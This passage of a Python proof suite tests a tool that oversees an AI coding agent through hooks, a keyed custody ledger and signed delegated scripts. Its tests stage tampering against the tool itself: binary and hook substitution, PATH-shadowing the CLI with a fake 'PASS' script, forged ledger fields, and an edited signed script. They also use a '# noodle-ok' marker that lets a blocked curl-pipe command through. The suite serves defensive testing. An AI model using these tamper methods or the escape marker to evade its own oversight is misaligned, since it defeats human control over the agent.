            return r.fail(f"a clean install did not pass its own self-check: {base.findings}")
        r.observe(f"clean install passes self-check ({len(base.checked)} checks)")

        # (1) substitute the recorder binary itself
        binary.write_text("#!/bin/sh\necho 'I am definitely the real recorder'\n")
        rep = self_check(argv0=str(binary), manifest=manifest, root=root)
        if rep.ok or not any("recorder itself was substituted" in f for f in rep.findings):
            return r.fail(f"binary substitution not caught: {rep.findings}")
        r.observe(f"(1) recorder binary substituted -> CAUGHT: {rep.findings[0][:88]}")

        # (2) replace a pinned hook script
        binary.write_text("#!/bin/sh\nexec true\n")
        hook.write_text("#!/bin/sh\nexit 0  # tampered\n")
        rep = self_check(argv0=str(binary), manifest=manifest, root=root)
        if rep.ok or not any("substituted" in f and "coc_gate" in f for f in rep.findings):
            return r.fail(f"hook substitution not caught: {rep.findings}")
        r.observe(f"(2) pinned hook replaced -> CAUGHT: {rep.findings[0][:88]}")
        hook.write_text("#!/bin/sh\nexit 0\n")

        # (3) PATH-shadow the CLI — the Berkeley RDI fake-curl attack, exactly
        shadow_dir = root / "evil"
        shadow_dir.mkdir()
        shadow = shadow_dir / "stop-guessing"
        shadow.write_text("#!/bin/sh\necho 'PASS: everything is fine'\n")
        shadow.chmod(0o755)
        old_path = os.environ.get("PATH", "")
        os.environ["PATH"] = f"{shadow_dir}:{old_path}"
        try:
            rep = self_check(argv0=str(binary), manifest=manifest, root=root)
        finally:
            os.environ["PATH"] = old_path
        if rep.ok or not any("earlier on PATH" in f for f in rep.findings):
            return r.fail(f"PATH shadowing not caught: {rep.findings}")
        r.observe(f"(3) PATH-shadowed CLI -> CAUGHT: {rep.findings[0][:88]}")

        # (4) a world-writable ledger directory
        led = root / "ledger"
        led.mkdir()
        led.chmod(0o777)
        rep = self_check(argv0=str(binary), manifest=manifest, root=root, ledger_dir=led)
        if rep.ok or not any("world-writable" in f for f in rep.findings):
            return r.fail(f"world-writable ledger dir not caught: {rep.findings}")
        r.observe(f"(4) world-writable ledger dir -> CAUGHT ({statmod.filemode(led.stat().st_mode)})")
        led.chmod(0o700)

        # (5) a registration rewritten to a literal ~ (the 2026-07-16 incident shape)
        pinned = f"bash {root}/coc_gate.sh"
        settings = {"hooks": {"PreToolUse": [{"hooks": [
            {"command": "bash ~/.claude/hooks/coc_gate.sh"}]}]}}
        rep = self_check(argv0=str(binary), manifest=manifest, root=root,
                         settings=settings, pinned_command=pinned)
        if rep.ok or not any("literal ~" in f for f in rep.findings):
            return r.fail(f"tilde registration not caught: {rep.findings}")
        r.observe("(5) registration rewritten to a literal ~ -> CAUGHT")

        # the ledger is deny-listed under EVERY posture, including observe
        ps = load_policies(repo_root() / "policy" / "coc.policy.d")
        for posture in ("observe", "steer", "bar"):
            d = ps.evaluate("artifact.write", SessionCustodyState("s").context(
                posture=posture, call={"is_write": True, "is_egress": False},
                artifact={"classified": True, "is_ledger": True, "first_touch": True}))
            if d.outcome != "deny":
                return r.fail(f"ledger writable under {posture}: {d.outcome} via "
                              f"{d.determining_policy}")
        r.observe("ledger writes denied under observe, steer AND bar (postureless forbid)")

        clean = self_check(argv0=str(binary), manifest=manifest, root=root)
        if not clean.ok:
            return r.fail(f"self-check did not recover after restoration: {clean.findings}")
        r.observe(f"restored -> passes again; isolation_tier reported as {clean.isolation_tier} "
                  "(fallback, recorded, never silent)")

    # ── the recorder boundary, driven live ──────────────────────────────────
    # Until the daemon existed this claim rested on checks alone: the "recorder" was library code
    # in the agent's own process with the key in its own environment, so tier > 0 was aspirational.
    import threading

    from stop_guessing.ledger.chain import ChainKey, verify
    from stop_guessing.ledger.sink import load
    from stop_guessing.recorder import client, daemon

    dkey = ChainKey("proof-daemon", b"a-key-the-hook-never-sees-32b!!!")
    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        cfg = Path(td) / "claude"
        tier0, why0 = client.isolation_tier(cfg)
        if tier0 != 0:
            return r.fail(f"no daemon should mean tier 0, got {tier0}")
        r.observe(f"no daemon -> tier 0 ({why0})")

        ready = threading.Event()
        server = daemon.serve(cfg, key=dkey, ready=ready)
        th = threading.Thread(target=server.serve_forever, daemon=True)
        th.start()
        ready.wait(5)
        try:
            info = client.daemon_info(cfg)
            if not info or not info.get("keyed"):
                return r.fail("the daemon did not come up keyed")
            tier, why = client.isolation_tier(cfg)
            r.observe(f"daemon up -> tier {tier} ({why}), pid {info['pid']}")

            # The caller holds NO key and still gets a keyed record.
            out = client.append(cfg, {"op": "artifact.read", "at": "t", "actor": "hook"},
                                fallback_key=None)
            if out.ref is None or out.via != "daemon":
                return r.fail(f"the daemon did not record: {out.to_dict()}")
            entries = load(daemon.ledger_path(cfg), dkey).entries
            if entries[0]["hash_alg"] != "hmac-sha256":
                return r.fail("the record is not keyed")
            if not verify(entries, dkey).intact:
                return r.fail("the record does not verify under the daemon's key")
            r.observe("a caller holding NO key produced a keyed record that verifies under the "
                      "daemon's key — key separation, not policy")

            # A caller cannot choose its own place in history.
            client.append(cfg, {"op": "artifact.read", "at": "t", "actor": "hook",
                                "seq": 999, "prev_hash": "0" * 64, "hash": "f" * 64,
                                "hash_alg": "sha256", "keyid": "mine"})
            entries = load(daemon.ledger_path(cfg), dkey).entries
            if [e["seq"] for e in entries] != [0, 1] or entries[1]["hash_alg"] != "hmac-sha256":
                return r.fail("a caller chose its own sequence or algorithm")
            r.observe("a caller supplying its own seq/prev_hash/hash was overridden by the "
                      "recorder — it cannot insert itself anywhere in history")

            # Integrity refusals are not laundered by the fallback.
            led = daemon.ledger_path(cfg)
            lines = led.read_text().splitlines()
            d0 = json.loads(lines[0])
            d0["detail"] = "TAMPERED"
            lines[0] = json.dumps(d0, sort_keys=True, separators=(",", ":"))
            led.write_text("\n".join(lines) + "\n")
            before = len(led.read_text().splitlines())
            out = client.append(cfg, {"op": "artifact.read", "at": "t"}, fallback_key=dkey)
            if out.ref is not None or len(led.read_text().splitlines()) != before:
                return r.fail("a daemon integrity refusal was laundered by the fallback")
            r.observe("daemon refused on a tampered chain, and the fallback did NOT launder it")
        finally:
            server.shutdown()
            server.server_close()
            daemon.socket_path(cfg).unlink(missing_ok=True)

        after, _ = client.isolation_tier(cfg)
        if after != 0:
            return r.fail("tier did not drop when the daemon stopped")
        r.observe("daemon stopped -> tier drops back to 0; the tier is derived, never asserted")

    r.evidence = {"attacks_caught": 5, "postures_denying_ledger_write": 3,
                  "recorder_boundary_verified": True, "max_tier_observed": 1,
                  "tier_2_note": "needs a service account; not created here, so not claimed"}
    return r


# ── CLAIM-18 — offline by default, audited rather than asserted ─────────────


@proof("CLAIM-18", "property", "Audit the shipped package for network call sites.")
def prove_offline_by_default() -> ProofResult:
    from stop_guessing.recorder.network import ALLOWED, audit

    r = ProofResult(passed=True)
    pkg = repo_root() / "stop_guessing"
    result = audit(pkg)
    r.observe(f"scanned {result['files_scanned']} shipped module(s) for network call shapes")

    if not result["offline_by_default"]:
        for s in result["unexpected"][:6]:
            r.observe(f"  UNEXPECTED {s['path']}:{s['line']} [{s['pattern']}] {s['text']}")
        return r.fail(f"{len(result['unexpected'])} unexpected network call site(s)")
    r.observe("no unexpected network call sites in the shipped package")
    r.observe("SCOPE: this is a SOURCE AUDIT. It cannot see indirect subprocess calls, shell "
              "network programs, dynamic imports, native extensions, or commands assembled at "
              "runtime. It does not prove the package makes no network calls (#27).")
    r.observe(f"named exceptions ({len(ALLOWED)}), each opt-in and off by default:")
    for (path, pat), why in ALLOWED.items():
        r.observe(f"  {path} [{pat}] — {why}")

    # #72 (SG-HARD-039). This used to assert "CI performs no fetch" on the grounds that ci.yml
    # contains no literal curl or wget. That was false, and the test was the reason nobody noticed:
    # actions/checkout, actions/setup-python and pip install each resolve something remote. The
    # sub-claim is withdrawn from CLAIM-18 rather than reworded into something still untrue, and
    # what CI actually fetches is now enumerated as an observation instead of denied.
    ci = (repo_root() / ".github" / "workflows" / "ci.yml").read_text()
    fetchers = sorted({m for m in ("actions/checkout", "actions/setup-python", "pip install",
                                   "curl", "wget") if m in ci})
    r.observe("SCOPE: this claim is about the SHIPPED PACKAGE's source, not about CI. CI does "
              "fetch, and the build-time retrieval it performs is: "
              + (", ".join(fetchers) or "none detected"))
    r.evidence = {"files_scanned": result["files_scanned"],
                  "sites": len(result["sites"]), "unexpected": 0}
    return r


# ── CLAIM-10 — bar: handles and summaries only, signed scripts only ─────────


@proof("CLAIM-10", "negative", "Under bar, try an unsigned script, an edited one, then a signed one.")
def prove_bar_requires_signed_scripts() -> ProofResult:
    from stop_guessing.delegate import (
        DelegationRefused,
        emit_for_model,
        run,
        run_test,
        scaffold,
        sign_script,
        verify_script,
    )
    from stop_guessing.policy.engine import load as load_policies
    from stop_guessing.taint.state import SessionCustodyState

    r = ProofResult(passed=True)
    ps = load_policies(repo_root() / "policy" / "coc.policy.d")
    key = b"a-key-the-model-cannot-reach!!!!"

    art = {"classified": True, "first_touch": True, "labels": ["restricted", "pii"]}
    d = ps.evaluate("artifact.read", SessionCustodyState("s").context(
        posture="bar", call={"is_egress": False, "is_write": False,
                             "delegated_script": {"signed": False}}, artifact=art))
    if d.outcome != "deny":
        return r.fail(f"bar allowed a direct classified read: {d.outcome} via "
                      f"{d.determining_policy}")
    r.observe(f"direct classified read under bar -> DENY via {d.determining_policy}")

    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        dd = Path(td) / "scripts"
        deleg = scaffold(dd, "summarise", "Summarise without returning rows.")
        deleg.script.write_text(
            "import sys\n\n\ndef handle(paths):\n"
            "    return f'{len(paths)} artifact(s), 4213 rows'\n\n\n"
            "if __name__ == '__main__':\n    print(handle(sys.argv[1:]))\n", encoding="utf-8")
        if not run_test(deleg)["passed"]:
            return r.fail("the implemented script's test did not pass")

        ok, why = verify_script(deleg.script, key)
        if ok:
            return r.fail("an unsigned script verified")
        r.observe(f"unsigned script -> REFUSED: {why}")

        rec = sign_script(deleg.script, key, "bar-key-1")
        ok, why = verify_script(deleg.script, key)
        if not ok:
            return r.fail(f"a freshly signed script did not verify: {why}")
        r.observe(f"signed -> {why} (signature binds the DIGEST {rec['script_digest'][:16]}…)")

        ok, why = verify_script(deleg.script, b"a-different-key-the-agent-made!!")
        if ok:
            return r.fail("a script verified under the wrong key")
        r.observe(f"wrong key -> REFUSED: {why}")

        original = deleg.script.read_text()
        deleg.script.write_text(original + "\n# smuggled\n", encoding="utf-8")
        ok, why = verify_script(deleg.script, key)
        if ok:
            return r.fail("an edited script still verified — the signature is not bound to content")
        r.observe(f"edited after signing -> REFUSED: {why}")
        deleg.script.write_text(original, encoding="utf-8")

        moved = deleg.script.parent / "renamed.py"
        moved.write_text(original, encoding="utf-8")
        Path(str(moved) + ".sig.json").write_text(
            Path(str(deleg.script) + ".sig.json").read_text(), encoding="utf-8")
        ok, _ = verify_script(moved, key)
        if not ok:
            return r.fail("renaming broke the signature; identity must follow content, not path")
        r.observe("renamed but unmodified -> still verifies (identity follows content)")

        d2 = ps.evaluate("artifact.read", SessionCustodyState("s").context(
            posture="bar", call={"is_egress": False, "is_write": False,
                                 "delegated_script": {"signed": True, "test_passed": True}},
            artifact=art))
        if d2.outcome != "allow":
            return r.fail(f"bar refused a signed, tested script: {d2.outcome}")
        r.observe(f"signed + tested script under bar -> ALLOW via {d2.determining_policy}")

        out = run(deleg, ["/x/roster.csv"])
        if out["sandbox"]["kind"] != "env-allowlist-only":
            return r.fail("the record overstates the isolation the delegated run actually had")
        full = emit_for_model(out["output"], "full")
        handle = emit_for_model(out["output"], "handle", artifact_id="art_roster")
        summary = emit_for_model(out["output"], "summary")
        if "4213" not in full["content"]:
            return r.fail("the full emit did not carry the output")
        if "4213" in str(handle) or "4213" in str(summary.get("first_line_shape", "")):
            return r.fail("a handle or summary leaked the content it was meant to withhold")
        r.observe(f"emit full    -> {full['content'].strip()!r}")
        r.observe(f"emit handle  -> {handle['handle']} ({handle['lines']} lines, "
                  f"{handle['bytes']} bytes) — no content")
        r.observe(f"emit summary -> shape {summary['first_line_shape']!r} — no values")
        r.observe("under bar the model receives the handle and the summary, never the bytes")
        try:
            run(deleg, ["/x/roster.csv"], )
        except DelegationRefused as exc:
            return r.fail(f"a valid delegated run was refused: {exc}")
        r.evidence = {"refusals": 3, "emit_modes": 3}
    return r


# ── CLAIM-15 — a fill never modifies the template ───────────────────────────


@proof("CLAIM-15", "negative", "Fill from the real template and confirm it is byte-identical after.")
def prove_fill_never_touches_the_template() -> ProofResult:
    from stop_guessing.caiq.fill import FillRefused, fill, verify_with_rich_text

    r = ProofResult(passed=True)
    try:
        tpl = _caiq_template()  # resolved, never hardcoded — see the helper
    except FileNotFoundError as exc:
        return r.fail(str(exc))

    before = file_digest(tpl)
    before_mtime = tpl.stat().st_mtime_ns
    answers = {
        "DSP-20": {"answer": "Yes", "ssrm": "Owned by OSP",
                   "implementation": "Derivation edges recorded into a keyed ledger."},
        "LOG-10": {"answer": "Yes", "ssrm": "Owned by OSP",
                   "implementation": "HMAC-keyed hash chain; append refuses onto a broken chain."},
        "IPY-01": {"answer": "NA", "implementation": "Not applicable to a local CLI tool."},
    }
    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        out = Path(td) / "AI-CAIQ-test-v1.1.0.xlsx"
        res = fill(tpl, answers, out)
        if not res.template_untouched:
            return r.fail("THE TEMPLATE WAS MODIFIED BY A FILL")
        r.observe(f"filled {res.controls_answered} controls across {res.rows_written} question "
                  f"rows -> {out.name}")
        r.observe(f"template digest before {before[:16]}… after {res.template_digest_after[:16]}… "
                  "-> UNCHANGED")
        if tpl.stat().st_mtime_ns != before_mtime:
            return r.fail("the template's mtime changed")
        r.observe("template mtime unchanged too")

        ok, detail = verify_with_rich_text(tpl, out)
        if not ok:
            return r.fail(f"rich-text's verifier rejected our output: {detail}")
        r.observe(f"rich-text verify_ai_caiq_workbook.py (unmodified): {detail.splitlines()[-1]}")

        try:
            fill(tpl, {"IVS-01": {"answer": "Yes"}}, Path(td) / "bad.xlsx")
            return r.fail("accepted IVS-01, which does not exist in AICM v1.1.0")
        except FillRefused as exc:
            if "IVS-*" not in str(exc):
                return r.fail(f"refused for the wrong reason: {exc}")
            r.observe("IVS-01 -> REFUSED (it is I&S; an isalpha() filter drops the ampersand)")

        try:
            fill(tpl, {"DSP-20": {"answer": "Partial"}}, Path(td) / "bad2.xlsx")
            return r.fail("accepted 'Partial', which is not in CSA's vocabulary")
        except FillRefused as exc:
            r.observe(f"answer 'Partial' -> REFUSED ({str(exc)[:60]}…)")

        try:
            fill(tpl, {"DSP-20": {"answer": "NA", "ssrm": "Owned by OSP"}},
                 Path(td) / "bad3.xlsx")
            return r.fail("accepted NA with an SSRM owner set")
        except FillRefused as exc:
            r.observe(f"NA + ownership -> REFUSED ({str(exc)[:56]}…)")

        drift = Path(td) / "drift.xlsx"
        drift.write_bytes(tpl.read_bytes())
        import openpyxl
        wb = openpyxl.load_workbook(drift)
        wb["AI-CAIQv1.1.0"].cell(1, 1).value = json.dumps(
            {"specification_name": "AI Controls Matrix", "specification_version": "1.0.2"})
        wb.save(drift)
        try:
            fill(drift, answers, Path(td) / "bad4.xlsx")
            return r.fail("filled from a drifted template")
        except FillRefused as exc:
            if "drifted template" not in str(exc):
                return r.fail(f"refused for the wrong reason: {exc}")
            r.observe("fill from a DRIFTED template -> REFUSED (regeneration blocked on drift)")

    if file_digest(tpl) != before:
        return r.fail("the template changed across the whole procedure")
    r.observe(f"copy-only holds across every path: {before[:24]}…")
    r.evidence = {"template_sha256": before, "refusals": 4,
                  "rich_text_verified": True}
    return r


# ── CLAIM-17 — every no-noodles surface keeps working after supersession ────


@proof("CLAIM-17", "live-run", "Exercise every no-noodles surface through the dispatcher.")
def prove_no_noodles_surfaces_survive() -> ProofResult:
    import os
    import shutil

    from stop_guessing.cli.hook_gate import VENDORED_ORDER, run_vendored
    from stop_guessing.compat import manifest

    r = ProofResult(passed=True)
    m = manifest.verify()
    if not m["intact"]:
        return r.fail(f"the vendored tree drifted: {m}")
    r.observe(f"vendored tree intact: {len(m['ok'])} files match MANIFEST.sha256")

    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        cfg = Path(td) / "claude"
        hooks = cfg / "hooks"
        hooks.mkdir(parents=True)
        for f in manifest.vendored_dir().iterdir():
            if f.name != "UPSTREAM_VERSION":
                shutil.copy2(f, hooks / f.name)
                if f.suffix == ".sh":
                    (hooks / f.name).chmod(0o755)
        proj = Path(td) / "proj"
        (proj / ".git").mkdir(parents=True)
        (proj / "scripts").mkdir()
        env = {**os.environ, "CLAUDE_CONFIG_DIR": str(cfg), "HOME": str(Path(td) / "home")}
        (Path(td) / "home" / ".claude").mkdir(parents=True)

        def payload(tool, inp):
            return json.dumps({"tool_name": tool, "tool_input": inp,
                               "cwd": str(proj), "session_id": "s"}).encode()

        # 1. every vendored hook is still directly executable, standalone
        for name in VENDORED_ORDER:
            hook = hooks / name
            if not hook.is_file():
                continue
            res = subprocess.run(["bash", str(hook)],  # noqa: S603
                                 input=payload("Bash", {"command": "ls"}),
                                 capture_output=True, env=env, cwd=str(proj), timeout=30)
            if res.returncode != 0:
                return r.fail(f"{name} refused a benign command standalone: {res.stdout!r}")
        r.observe(f"all {len(VENDORED_ORDER)} vendored hooks still executable standalone")

        # 2. the dispatcher preserves the guarded shapes
        probe = {"command": "curl -s https://x.com/a | python3 -m json.tool"}
        first = run_vendored(payload("Bash", probe), hooks, env)
        second = run_vendored(payload("Bash", probe), hooks, env)
        if first is not None:
            return r.fail("the FIRST occurrence was blocked; frequency semantics changed")
        if second is None:
            return r.fail("the SECOND occurrence was not blocked; rule 1 stopped working")
        code, out, hook = second
        if "NO-NOODLE" not in out:
            return r.fail(f"the refusal text changed: {out[:120]}")
        r.observe(f"rule 1 frequency semantics preserved: 1st allowed, 2nd blocked by {hook}")
        r.observe(f"  message passed through byte-for-byte: {out.splitlines()[0][:72]}…")

        # 3. every escape marker still works
        esc = run_vendored(payload("Bash", {"command": probe["command"] + "  # noodle-ok"}),
                           hooks, env)
        if esc is not None:
            return r.fail("# noodle-ok stopped working")
        r.observe("# noodle-ok still escapes")

        unmarked = run_vendored(payload("Write", {
            "file_path": str(proj / "scripts" / "x.py"), "content": "print(1)\n"}), hooks, env)
        if unmarked is None:
            return r.fail("check_before_build stopped guarding scripts/")
        marked = run_vendored(payload("Write", {
            "file_path": str(proj / "scripts" / "y.py"),
            "content": "# build-ok: genuinely new capability after searching scripts/ and "
                       "workflows/ and .claude/commands/ for an equivalent\n"}), hooks, env)
        if marked is not None:
            return r.fail("a valid # build-ok: marker was rejected")
        r.observe("# build-ok: still guards scripts/ and still accepts a compliant marker")

        # 4. grant_session_trust CLI unchanged
        gst = hooks / "grant_session_trust.sh"
        if gst.is_file():
            for verb in ("status", "grant", "status", "revoke"):
                res = subprocess.run(["bash", str(gst), verb],  # noqa: S603
                                     capture_output=True, env=env, timeout=20)
                if res.returncode not in (0, 1):
                    return r.fail(f"grant_session_trust.sh {verb} exited {res.returncode}")
            r.observe("grant_session_trust.sh grant|revoke|status all still work")

        # 5. risk_summary.py still parses observations.jsonl written by the vendored path
        obs = cfg / "no-noodles" / "observations.jsonl"
        if obs.is_file():
            rs = hooks / "risk_summary.py"
            res = subprocess.run([sys.executable, str(rs), str(obs)],  # noqa: S603
                                 capture_output=True, env=env, timeout=30)
            if res.returncode != 0:
                return r.fail(f"risk_summary.py could not parse observations.jsonl: "
                              f"{res.stderr.decode()[:200]}")
            r.observe(f"observations.jsonl written ({sum(1 for _ in obs.open())} lines) and "
                      "risk_summary.py still parses it")
        else:
            return r.fail("no observations.jsonl was written — risk_observe stopped running")

        # 6. slash commands install to BOTH locations
        res = subprocess.run(  # noqa: S603
            ["bash", str(repo_root() / "install.sh"), "--profile", str(cfg)],
            capture_output=True, timeout=60)
        if res.returncode != 0:
            return r.fail(f"install failed: {res.stderr.decode()[:200]}")
        for doc in ("custody", "custody-options"):
            if not (cfg / "commands" / f"{doc}.md").is_file():
                return r.fail(f"/{doc} not installed to commands/ — it would never register")
            if not (cfg / "skills" / f"{doc}.md").is_file():
                return r.fail(f"{doc} not installed to skills/")
        r.observe("slash commands installed to BOTH commands/ and skills/ (2026-07-29 finding)")

        settings = json.loads((cfg / "settings.json").read_text())
        cmds = [h["command"] for g in settings["hooks"]["PreToolUse"] for h in g["hooks"]]
        if any("~" in c for c in cmds):
            return r.fail(f"a registration contains a literal ~: {cmds}")
        r.observe(f"registration uses a resolved absolute path: {cmds[0][:64]}…")
        r.evidence = {"vendored_files": len(m["ok"]), "surfaces_checked": 6}
    return r


# ── CLAIM-19 — uninstall removes hooks and PRESERVES the evidence ───────────


@proof("CLAIM-19", "live-run", "Install, accumulate evidence, uninstall, check what survived.")
def prove_uninstall_preserves_the_ledger() -> ProofResult:
    r = ProofResult(passed=True)
    with tempfile.TemporaryDirectory(prefix="sg-proof-") as td:
        cfg = Path(td) / "claude"
        cfg.mkdir()
        (cfg / "settings.json").write_text(json.dumps({
            "hooks": {"PreToolUse": [{"hooks": [
                {"type": "command", "command": "bash /somewhere/unrelated_tool.sh"}]}]},
            "unrelatedKey": {"belongs": "to someone else"}}))

        installer = str(repo_root() / "install.sh")
        res = subprocess.run(["bash", installer, "--profile", str(cfg)],  # noqa: S603
                             capture_output=True, timeout=60)
        if res.returncode != 0:
            return r.fail(f"install failed: {res.stderr.decode()[:200]}")
        if not (cfg / "hooks" / "coc_gate.sh").is_file():
            return r.fail("the dispatcher was not installed")
        r.observe("installed: dispatcher, commands, skills, VERSION stamp")

        led = cfg / "stop-guessing" / "ledger"
        led.mkdir(parents=True, exist_ok=True)
        ledger = led / "custody.jsonl"
        for i in range(12):
            record(ledger, {"op": "artifact.read", "actor": "a", "detail": f"e{i}", "at": "t"},
                   PROOF_KEY)
        obs = cfg / "no-noodles"
        obs.mkdir(exist_ok=True)
        (obs / "observations.jsonl").write_text('{"ts":"t","outcome":"allowed"}\n')
        before_digest = file_digest(ledger)
        r.observe(f"accumulated 12 ledger records ({before_digest[:16]}…) + an observation log")

        res = subprocess.run(["bash", installer, "--profile", str(cfg), "--uninstall"],  # noqa: S603
                             capture_output=True, timeout=60)
        if res.returncode != 0:
            return r.fail(f"uninstall failed: {res.stderr.decode()[:200]}")

        if (cfg / "hooks" / "coc_gate.sh").exists():
            return r.fail("the dispatcher survived uninstall")
        if (cfg / "commands" / "custody.md").exists():
            return r.fail("a slash command survived uninstall")
        settings = json.loads((cfg / "settings.json").read_text())
        cmds = [h["command"] for g in settings["hooks"]["PreToolUse"] for h in g["hooks"]]
        if any("coc_gate" in c for c in cmds):
            return r.fail("the registration survived uninstall")
        r.observe("removed: dispatcher, slash commands, registration")

        if "unrelated_tool.sh" not in " ".join(cmds):
            return r.fail("uninstall removed an unrelated hook")
        if settings.get("unrelatedKey", {}).get("belongs") != "to someone else":
            return r.fail("uninstall clobbered an unrelated settings key")
        r.observe("preserved: the unrelated hook AND the unrelated settings key")

        if not ledger.is_file():
            return r.fail("THE LEDGER WAS DELETED BY UNINSTALL")
        after = file_digest(ledger)
        if after != before_digest:
            return r.fail(f"the ledger was modified by uninstall ({after[:16]}…)")
        loaded = load(ledger, PROOF_KEY)
        if len(loaded.entries) != 12 or not loaded.chain.intact:
            return r.fail("the preserved ledger no longer verifies")
        r.observe("PRESERVED: all 12 ledger records, digest unchanged, chain still verifies")
        if not (obs / "observations.jsonl").is_file():
            return r.fail("the observation log was deleted")
        r.observe("PRESERVED: observations.jsonl — accumulated evidence is not disposable state")
        r.evidence = {"records_preserved": 12, "ledger_digest": before_digest}
    return r


# ── CLAIM-20 — every distributed surface exercised by a live run ────────────


@proof("CLAIM-20", "live-run", "Exercise the CLI, the hook, the plugin manifests and the skills.")
def prove_every_surface_runs() -> ProofResult:
    r = ProofResult(passed=True)
    root = repo_root()

    # 1. CLI — every subcommand, through the installed console script path
    cli = [["version"], ["manifest"], ["compat", "corpus"], ["ledger", "--help"],
           ["claims", "check", "--ledger", str(runner_ledger())],
           ["attest", "--self", "--ledger", str(runner_ledger()), "--json"]]
    for args in cli:
        res = subprocess.run(  # noqa: S603
            [sys.executable, "-m", "stop_guessing.cli.main", *args],
            capture_output=True, cwd=str(root), timeout=180)
        if res.returncode not in (0, 1):  # 1 = a gate correctly reporting not-yet
            return r.fail(f"CLI `{' '.join(args)}` exited {res.returncode}: "
                          f"{res.stderr.decode()[:200]}")
    r.observe(f"CLI: {len(cli)} subcommand paths exercised, all exit 0 or 1")

    for alias in ("stop-guessing", "coc-prov", "coc"):
        script = root / ".venv" / "bin" / alias
        if not script.exists():
            return r.fail(f"console script {alias} was not installed")
    r.observe("console scripts present: stop-guessing, coc-prov, coc (aliases kept forever)")

    # 2. The hook, driven exactly as Claude Code drives it: JSON on stdin.
    #    HERMETIC: its own CLAUDE_CONFIG_DIR. Without one this read the maintainer's accumulated
    #    real state, so a previously-touched artifact came back `allow` instead of `ask` and the
    #    proof failed for a reason that had nothing to do with the claim. Same hermeticity trap
    #    that bit CLAIM-17 and no-noodles' own tests before it.
    import os as _os
    import tempfile as _tf

    box = _tf.mkdtemp(prefix="sg-surface-")
    env = {**_os.environ, "CLAUDE_CONFIG_DIR": str(Path(box) / "claude")}
    classified = Path(box) / "roster.csv"
    classified.write_text("name,email\nA,a@x\n", encoding="utf-8")
    cases = [
        ("Read", {"file_path": str(classified)}, "ask"),
        ("Bash", {"command": "ls -la"}, None),
        ("Read", {"file_path": str(Path(box) / "ordinary.md")}, None),
    ]
    for tool, inp, want in cases:
        payload = json.dumps({"tool_name": tool, "tool_input": inp,
                              "session_id": f"surface-{tool}"}).encode()
        res = subprocess.run(  # noqa: S603
            [sys.executable, "-m", "stop_guessing.cli.hook_gate"],
            input=payload, capture_output=True, cwd=str(root), env=env, timeout=60)
        if res.returncode != 0:
            return r.fail(f"the hook exited {res.returncode} on {tool}")
        out = res.stdout.decode().strip()
        got = json.loads(out)["hookSpecificOutput"]["permissionDecision"] if out else None
        if got != want:
            return r.fail(f"hook on {tool} {inp} gave {got!r}, expected {want!r}")
    r.observe(f"hook: {len(cases)} payloads driven on stdin exactly as Claude Code drives it, "
              "in a hermetic CLAUDE_CONFIG_DIR")
    r.observe("  classified Read -> ask; benign Bash -> silent; ordinary Read -> silent")
    led = Path(env["CLAUDE_CONFIG_DIR"]) / "stop-guessing" / "ledger" / "custody.jsonl"
    if not led.is_file():
        return r.fail("the hook wrote no custody record — the deployed path records nothing")
    recs = [json.loads(x) for x in led.read_text().splitlines()]
    r.observe(f"  and wrote {len(recs)} keyed custody record(s): "
              f"{', '.join(sorted({x['op'] for x in recs}))}")

    # 3. Plugin manifests, both ecosystems, versions agreeing with VERSION
    version = (root / "VERSION").read_text().strip()
    manifests = {
        ".claude-plugin/marketplace.json": ["plugins", 0, "version"],
        ".claude-plugin/plugins/stop-guessing/.claude-plugin/plugin.json": ["version"],
        ".agents/plugins/marketplace.json": ["plugins", 0, "version"],
        ".agents/plugins/stop-guessing/.codex-plugin/plugin.json": ["version"],
    }
    for rel, path in manifests.items():
        p = root / rel
        if not p.is_file():
            return r.fail(f"missing manifest {rel}")
        cur = json.loads(p.read_text())
        for part in path:
            cur = cur[part]
        if cur != version:
            return r.fail(f"{rel} says {cur!r}, VERSION says {version!r} — rich-text drifted "
                          "exactly this way (plugin.json 0.2.14 vs manifest.yaml 0.3.0)")
    r.observe(f"plugin manifests: {len(manifests)} across both ecosystems, all at {version}")

    hooks_json = json.loads(
        (root / ".claude-plugin/plugins/stop-guessing/hooks/hooks.json").read_text())
    if "PreToolUse" not in hooks_json["hooks"]:
        return r.fail("the plugin declares no PreToolUse hook")
    r.observe("plugin declares its PreToolUse hook")

    # 4. Skills / slash commands, installed to BOTH locations
    for doc in ("custody", "custody-options"):
        src = root / "skills" / f"{doc}.md"
        if not src.is_file():
            return r.fail(f"skills/{doc}.md missing")
        text = src.read_text()
        if not text.startswith("---") or "description:" not in text:
            return r.fail(f"skills/{doc}.md has no frontmatter; it would never be discovered")
        if not (root / ".claude-plugin/plugins/stop-guessing/commands" / f"{doc}.md").is_file():
            return r.fail(f"/{doc} not shipped in the plugin's commands/")
    if not (root / ".claude-plugin/plugins/stop-guessing/skills/stop-guessing/SKILL.md").is_file():
        return r.fail("the plugin ships no skills/<name>/SKILL.md — the only form that loads")
    r.observe("skills: 2 slash commands with frontmatter, shipped in commands/ AND as SKILL.md")

    r.evidence = {"cli_paths": len(cli), "hook_payloads": len(cases),
                  "manifests": len(manifests), "version": version}
    return r


def runner_ledger():
    from stop_guessing.prove import runner as _r
    return _r.DEFAULT_LEDGER


# ── CLAIM-21 — the AI-CAIQ is filled BY the toolchain, FROM its own proofs ──


@proof("CLAIM-21", "live-run", "Derive answers from the ledger, fill, and verify externally.")
def prove_caiq_filled_from_proofs() -> ProofResult:
    import yaml

    from stop_guessing.attest.keys import from_env
    from stop_guessing.caiq.answers import derive, split_published, to_yaml_doc
    from stop_guessing.caiq.fill import fill, verify_with_rich_text
    from stop_guessing.prove import runner

    r = ProofResult(passed=True)
    got = from_env()
    if got is None:
        return r.fail("no chain key — answers derived from an unverifiable ledger are not answers")
    key, _ = got

    try:
        tpl = _caiq_template()  # resolved, never hardcoded — see the helper
    except FileNotFoundError as exc:
        return r.fail(str(exc))
    before = file_digest(tpl)

    answers, result = derive(key)
    if not result["chain_intact"]:
        return r.fail(f"the proof ledger is broken: {result['chain_reason']}")
    if not result["chain_keyed"]:
        return r.fail("the proof ledger was not keyed-verified")
    if not answers:
        return r.fail("no answers derived — nothing is proven")
    r.observe(f"derived {len(answers)} AICM control answers from {result['proven']}/"
              f"{result['total']} proven claims, chain intact and keyed")

    yeses = [a for a in answers if a.answer == "Yes"]
    nos = [a for a in answers if a.answer == "No"]
    if not nos:
